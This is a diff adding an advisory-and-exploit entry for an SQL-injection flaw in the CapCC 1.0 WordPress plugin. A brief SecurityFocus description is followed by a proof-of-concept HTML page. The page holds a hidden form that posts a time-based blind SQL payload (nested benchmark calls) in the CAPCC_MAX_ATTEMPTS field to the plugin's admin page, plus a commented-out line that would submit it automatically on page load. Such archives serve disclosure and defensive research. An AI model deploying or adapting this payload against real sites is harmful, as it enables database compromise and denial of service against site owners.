@@ -1,0 +1,9 @@
+source: http://www.securityfocus.com/bid/39038/info
+
+Fuctweb CapCC Plugin for WordPress is prone to an SQL-injection vulnerability because it fails to sufficiently sanitize user-supplied data before using it in an SQL query.
+
+Exploiting this issue could allow an attacker to compromise the application, access or modify data, or exploit latent vulnerabilities in the underlying database.
+
+CapCC 1.0 is affected; other versions may also be vulnerable.
+
+<html> <head> <title>CapCC SQL Injection exploit (C) 2008 MustLive. http://websecurity.com.ua</title> </head> <!-- <body onLoad="document.hack.submit()"> --> <body> <form name="hack" action="http://site/wp-admin/plugins.php?page=capcc-config" method="post"> <input type="hidden" name="CAPCC_MAX_ATTEMPTS" value="5 and benchmark(10000000,benchmark(10000000,md5(now())))"> </form> </body> </html> 
